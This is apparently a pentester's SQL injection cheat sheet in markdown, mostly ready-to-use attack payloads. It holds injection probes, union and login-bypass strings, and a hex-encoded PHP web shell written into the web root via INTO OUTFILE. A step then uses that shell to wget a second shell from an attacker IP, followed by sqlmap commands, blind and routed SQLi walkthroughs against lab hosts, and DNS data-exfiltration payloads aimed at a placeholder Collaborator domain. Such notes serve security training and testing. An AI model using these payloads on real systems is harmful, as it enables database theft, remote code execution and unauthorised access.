---
title: SQLi 💉
---
## Entry point detection

```sql
'
"
`
')
")
`)
'))
"))
`))
```

## Union based

### Union Select

```sql
ID union select 1,2,3,4
' union select 1, @@version-- -
' union select 1, table_name FROM information_schema.tables-- -
```

### Union Group By / Order

```sql
1' ORDER BY 1--+    #True
1' ORDER BY 2--+    #True
1' ORDER BY 3--+    #True
1' ORDER BY 4--+    #False -> query is only using 3 columns
```

```sql
1' GROUP BY 1--+    #True
1' GROUP BY 2--+    #True
1' GROUP BY 3--+    #True
1' GROUP BY 4--+    #False -> query is only using 3 columns
```

## Upload webshell

`<?php echo "<pre>" . shell_exec($_GET["cmd"]) . "</pre>";?>` traduces in `0x3C3F706870206563686F20223C7072653E22202E207368656C6C5F6578656328245F4745545B22636D64225D29202E20223C2F7072653E223B3F3E` in hex format:
[Reverse shells 👾](reverse_shells.md)
```sql
' INTO OUTFILE '/var/www/html/shell.php' LINES TERMINATED BY 0x3C3F706870206563686F20223C7072653E22202E207368656C6C5F6578656328245F4745545B22636D64225D29202E20223C2F7072653E223B3F3E-- -
```

- If you get an error, the query has been executed correctly. Now check `/shell.php`
- Now, to gain a full shell, you can just upload one and then calling it like:
	- Create the shell (check [Reverse shells 👾](reverse_shells.md))
	- Create python web server
	- Download it from the browser: `http://domain.com/shell.php?cmd=wget http://IP_ATTACK:PORT/sexyshell.php`
	- Call it: `http://domain.com/sexyshell.php`

## Bypass a login

- You can try: 

```sql
username: admin' or 1=1-- -

password: whatever
```

## Storing location

- A common way to try to influence on our IP address via HTTP is to use the `X-Forwarded-For` header. We can directly set an injection point in this header:

```shell
sqlmap -u 'http://domain.com/path' -H 'X-Forwarded-For: YOUR_IP*' --risk 3 --level 5 --dbms MySQL
```

- The result might look like this:

```shell
sqlmap identified the following injection point(s) with a total of 2254 HTTP(s) requests:
---
Parameter: X-Forwarded-For #1* ((custom) HEADER)
    Type: stacked queries
    Title: MySQL >= 5.0.12 stacked queries (comment)
    Payload: 10.11.75.136';SELECT SLEEP(5)#

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: 10.11.75.136' AND (SELECT 8527 FROM (SELECT(SLEEP(5)))ACZe)-- jhGF
---
```

==Now go to the **Sqlmap** note to follow.==

## Boolean-based Blind

- When introducing a username to register and the app says if it is available or not, we can analyze the traffic and evaluate an API request:

![](Pasted%20image%2020240323224232.png)

- The request looks like this and returns a boolean in JSON:

```shell
curl "http://10.10.115.157/register/user-check?username=gitblanc" -s | jq
# returns:
{  
  "available": true  
}
# A username that is in use:
curl "http://10.10.115.157/register/user-check?username=admin" -s | jq
# returns:
{
  "available": false
}
```

- So we can try for:

```shell
curl "http://10.10.115.157/register/user-check?username=gitblanc' OR 1=2-- -" -s | jq
# returns:
{  
  "available": true  
}
curl "http://10.10.115.157/register/user-check?username=gitblanc' OR 1=1-- -" -s | jq
# returns:
{  
  "available": false  
}
curl "http://10.10.115.157/register/user-check?username=admin' OR 1=2-- -" -s | jq
# returns:
{  
  "available": true  
}
curl "http://10.10.115.157/register/user-check?username=admin' OR 1=1-- -" -s | jq
# returns:
{  
  "available": false  
}
```

- Try it with sqlmap: 

```shell
sqlmap -u 'http://domain.com/register/user-check?username=gitblanc' -p username --risk 3 --level 5 --dbms MySQL
```

## Routed SQLi

> **Routed SQL Injection** can be In-band, Inferential or Out-of-band. It is a special kind of SQLi attack where the injectable query is not the one which is leaking the data but the output of this query is the input of another query that is giving the final data leakage.
> 
The following piece of PHP code from _Zenodermus Javanicus_ illustrates how the vulnerability can be implemented on the server-side.

```php
<?php   
$id = $_GET['id'];  
$query = "SELECT id,sec_code FROM users WHERE id='$id'";  
  
if (!$result = mysql_query($query, $conn)) die("Error While Selection process : " . mysql_error());  
  
if (mysql_num_rows($result) == 0) die();  
$row = mysql_fetch_array($result, MYSQL_ASSOC);  
$query = "SELECT username FROM users WHERE sec_code='" . $row['sec_code'] . "'";  
echo "<br /><font color=red>This is the query which gives you Output : </font>$query<br /><br />";  
  
if (!$result = mysql_query($query, $conn)) die("Error While Selection process : " . mysql_error());  
  
if (mysql_num_rows($result) == 0) die("Invalid Input parameter");  
$row = mysql_fetch_array($result, MYSQL_ASSOC);  
echo 'Username is : ' . $row['username'] . "<br />"; ?>
```

>First, a classical SQLi attack can be conducted to deduce the number of columns of the first query.
>
Then, the first part of the first query need to be voided with something like `and false` or `and 1=0` so this will output 0 rows. Using `UNION SELECT` in the second part of the first query will allow to control the output.
>
>Example of payload:

```sql
?user=john' AND FALSE UNION SELECT 1,2,3-- -
```

>But instead of injecting dummy data in the second query, it is needed to encode the nested payload as hexadecimal to carry it.
>
>Example of payload:

```sql
?user=john' AND FALSE UNION SELECT 1,0x220756e696f6e2073656c65637420757365722c70617373776f72642d2d202d,3-- -
```

>It is needed to encode the nested payload to avoid it interfering with the root query. The goal is to use `UNION SELECT` in the first query to display a SQL payload as an input of the second query. So the decoded version of `0x220756e696f6e2073656c65637420757365722c70617373776f72642d2d202d` (`' union select user,password-- -`) will be injected in the second query. Routing the payload from a query to another.

- With the following payload, we are able to detect which columns are reflected:

```sql
2 union all select 'gitblanc','is','sexy' from users-- -
```

![](Pasted%20image%2020240323231230.png)

- So now, we can try to replace `gitblanc` or `is` with a SQL query.
- With the nested payload we can find which columns is reflected:

```sql
2 union all select '44 UNION SELECT 5,6,7,8-- -','is','sexy' from users-- -
```

![](Pasted%20image%2020240323231506.png)

- So now, we replace the nested to select the flag (now you could list tables and columns in a real scenario):

```sql
2 union all select '44 UNION SELECT 5,flag,7,8 from flag-- -','is','sexy' from users-- -
```

![](Pasted%20image%2020240323231734.png)

## In-band SQLi

- If you try a Union select attack like: `33 UNION SELECT 1,2,3,4` and you get an output like:

![](Pasted%20image%2020240323232050.png)

- Now you know that you have an **In-Band SQLi**
- ==Now list the databases with Sqlmap==

## Useful syntax for different databases

- Extracted from [SQL injection cheat sheet](https://portswigger.net/web-security/sql-injection/cheat-sheet).

*This SQL injection cheat sheet contains examples of useful syntax that you can use to perform a variety of tasks that often arise when performing SQL injection attacks.*

### String concatenation

You can concatenate together multiple strings to make a single string.


| Oracle     | `'foo'\|\|'bar'`                                                                  |
| ---------- | --------------------------------------------------------------------------------- |
| Microsoft  | `'foo'+'bar'`                                                                     |
| PostgreSQL | `'foo'\|\|'bar'`                                                                  |
| MySQL      | `'foo' 'bar'` [Note the space between the two strings]  <br>`CONCAT('foo','bar')` |

### Substring

You can extract part of a string, from a specified offset with a specified length. Note that the offset index is 1-based. Each of the following expressions will return the string `ba`.

| Oracle     | `SUBSTR('foobar', 4, 2)`    |
| ---------- | --------------------------- |
| Microsoft  | `SUBSTRING('foobar', 4, 2)` |
| PostgreSQL | `SUBSTRING('foobar', 4, 2)` |
| MySQL      | `SUBSTRING('foobar', 4, 2)` |

### Comments

You can use comments to truncate a query and remove the portion of the original query that follows your input.

| Oracle     | `--comment   `                                                                         |
| ---------- | -------------------------------------------------------------------------------------- |
| Microsoft  | `--comment   /*comment*/`                                                              |
| PostgreSQL | `--comment   /*comment*/`                                                              |
| MySQL      | `#comment`  <br>`-- comment` [Note the space after the double dash]  <br>`/*comment*/` |

### Database version

You can query the database to determine its type and version. This information is useful when formulating more complicated attacks.

| Oracle     | `SELECT banner FROM v$version   SELECT version FROM v$instance   ` |
| ---------- | ------------------------------------------------------------------ |
| Microsoft  | `SELECT @@version`                                                 |
| PostgreSQL | `SELECT version()`                                                 |
| MySQL      | `SELECT @@version`                                                 |

### Database contents

You can list the tables that exist in the database, and the columns that those tables contain.

| Oracle     | `SELECT * FROM all_tables   SELECT * FROM all_tab_columns WHERE table_name = 'TABLE-NAME-HERE'`                              |
| ---------- | ---------------------------------------------------------------------------------------------------------------------------- |
| Microsoft  | `SELECT * FROM information_schema.tables   SELECT * FROM information_schema.columns WHERE table_name = 'TABLE-NAME-HERE'   ` |
| PostgreSQL | `SELECT * FROM information_schema.tables   SELECT * FROM information_schema.columns WHERE table_name = 'TABLE-NAME-HERE'   ` |
| MySQL      | `SELECT * FROM information_schema.tables   SELECT * FROM information_schema.columns WHERE table_name = 'TABLE-NAME-HERE'   ` |

### Conditional errors

You can test a single boolean condition and trigger a database error if the condition is true.

| Oracle     | `SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN TO_CHAR(1/0) ELSE NULL END FROM dual`      |
| ---------- | --------------------------------------------------------------------------------------- |
| Microsoft  | `SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN 1/0 ELSE NULL END`                         |
| PostgreSQL | `1 = (SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN 1/(SELECT 0) ELSE NULL END)`          |
| MySQL      | `SELECT IF(YOUR-CONDITION-HERE,(SELECT table_name FROM information_schema.tables),'a')` |

### Extracting data via visible error messages

You can potentially elicit error messages that leak sensitive data returned by your malicious query.

| Microsoft  | `SELECT 'foo' WHERE 1 = (SELECT 'secret')      > Conversion failed when converting the varchar value 'secret' to data type int.` |
| ---------- | -------------------------------------------------------------------------------------------------------------------------------- |
| PostgreSQL | `SELECT CAST((SELECT password FROM users LIMIT 1) AS int)      > invalid input syntax for integer: "secret"`                     |
| MySQL      | `SELECT 'foo' WHERE 1=1 AND EXTRACTVALUE(1, CONCAT(0x5c, (SELECT 'secret')))      > XPATH syntax error: '\secret'`               |

### Batched (or stacked) queries

You can use batched queries to execute multiple queries in succession. Note that while the subsequent queries are executed, the results are not returned to the application. Hence this technique is primarily of use in relation to blind vulnerabilities where you can use a second query to trigger a DNS lookup, conditional error, or time delay.

| Oracle     | `Does not support batched queries.`                      |
| ---------- | -------------------------------------------------------- |
| Microsoft  | `QUERY-1-HERE; QUERY-2-HERE   QUERY-1-HERE QUERY-2-HERE` |
| PostgreSQL | `QUERY-1-HERE; QUERY-2-HERE`                             |
| MySQL      | `QUERY-1-HERE; QUERY-2-HERE`                             |

#### Note

With MySQL, batched queries typically cannot be used for SQL injection. However, this is occasionally possible if the target application uses certain PHP or Python APIs to communicate with a MySQL database.

### Time delays

You can cause a time delay in the database when the query is processed. The following will cause an unconditional time delay of 10 seconds.

| Oracle     | `dbms_pipe.receive_message(('a'),10)` |
| ---------- | ------------------------------------- |
| Microsoft  | `WAITFOR DELAY '0:0:10'`              |
| PostgreSQL | `SELECT pg_sleep(10)`                 |
| MySQL      | `SELECT SLEEP(10)`                    |

### Conditional time delays

You can test a single boolean condition and trigger a time delay if the condition is true.

| Oracle     | `SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN 'a'\|dbms_pipe.receive_message(('a'),10) ELSE NULL END FROM dual` |
| ---------- | -------------------------------------------------------------------------------------------------------------- |
| Microsoft  | `IF (YOUR-CONDITION-HERE) WAITFOR DELAY '0:0:10'`                                                              |
| PostgreSQL | `SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN pg_sleep(10) ELSE pg_sleep(0) END`                                |
| MySQL      | `SELECT IF(YOUR-CONDITION-HERE,SLEEP(10),'a')`                                                                 |

### DNS lookup

You can cause the database to perform a DNS lookup to an external domain. To do this, you will need to use [Burp Collaborator](https://portswigger.net/burp/documentation/desktop/tools/collaborator) to generate a unique Burp Collaborator subdomain that you will use in your attack, and then poll the Collaborator server to confirm that a DNS lookup occurred.

| Oracle     | ([XXE](https://portswigger.net/web-security/xxe)) vulnerability to trigger a DNS lookup. The vulnerability has been patched but there are many unpatched Oracle installations in existence:<br><br>`SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://BURP-COLLABORATOR-SUBDOMAIN/"> %remote;]>'),'/l') FROM dual`<br><br>The following technique works on fully patched Oracle installations, but requires elevated privileges:<br><br>`SELECT UTL_INADDR.get_host_address('BURP-COLLABORATOR-SUBDOMAIN')` |
| ---------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ |
| Microsoft  | `exec master..xp_dirtree '//BURP-COLLABORATOR-SUBDOMAIN/a'`                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    |
| PostgreSQL | `copy (SELECT '') to program 'nslookup BURP-COLLABORATOR-SUBDOMAIN'`                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                           |
| MySQL      | The following techniques work on Windows only:<br><br>`LOAD_FILE('\\\\BURP-COLLABORATOR-SUBDOMAIN\\a')`  <br>`SELECT ... INTO OUTFILE '\\\\BURP-COLLABORATOR-SUBDOMAIN\a'`                                                                                                                                                                                                                                                                                                                                                                                                     |

### DNS lookup with data exfiltration

You can cause the database to perform a DNS lookup to an external domain containing the results of an injected query. To do this, you will need to use [Burp Collaborator](https://portswigger.net/burp/documentation/desktop/tools/collaborator) to generate a unique Burp Collaborator subdomain that you will use in your attack, and then poll the Collaborator server to retrieve details of any DNS interactions, including the exfiltrated data.

| Oracle     | `SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://'\|(SELECT YOUR-QUERY-HERE)\|'.BURP-COLLABORATOR-SUBDOMAIN/"> %remote;]>'),'/l') FROM dual`                                                                                            |
| ---------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ |
| Microsoft  | `declare @p varchar(1024);set @p=(SELECT YOUR-QUERY-HERE);exec('master..xp_dirtree "//'+@p+'.BURP-COLLABORATOR-SUBDOMAIN/a"')`                                                                                                                                                                               |
| PostgreSQL | `create OR replace function f() returns void as $$   declare c text;   declare p text;   begin   SELECT into p (SELECT YOUR-QUERY-HERE);   c := 'copy (SELECT '''') to program ''nslookup '\|p\|'.BURP-COLLABORATOR-SUBDOMAIN''';   execute c;   END;   $$ language plpgsql security definer;   SELECT f();` |
| MySQL      | The following technique works on Windows only:  <br>`SELECT YOUR-QUERY-HERE INTO OUTFILE '\\\\BURP-COLLABORATOR-SUBDOMAIN\a'`                                                                                                                                                                                |